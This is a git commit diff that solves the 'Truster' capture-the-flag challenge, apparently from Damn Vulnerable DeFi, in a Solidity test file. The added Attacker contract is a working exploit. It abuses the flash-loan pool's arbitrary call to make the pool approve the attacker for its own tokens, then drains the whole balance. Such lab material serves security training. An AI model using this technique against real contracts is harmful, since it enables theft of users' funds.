1e7ef1490601d7552a5196a3a23004bd0fb405c3
Matias Anaya <matiasanaya@gmail.com>
2024-09-04 16:54:30 -0300

    truster: solve

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new Attacker().run(pool, recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -64,5 +64,20 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+    function run(TrusterLenderPool pool, address recovery, uint256 amount) public {
+        pool.flashLoan(
+            0,
+            address(this),
+            address(pool.token()),
+            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
+        );
+
+        pool.token().transferFrom(address(pool), address(this), amount);
+
+        pool.token().transfer(recovery, amount);
     }
 }
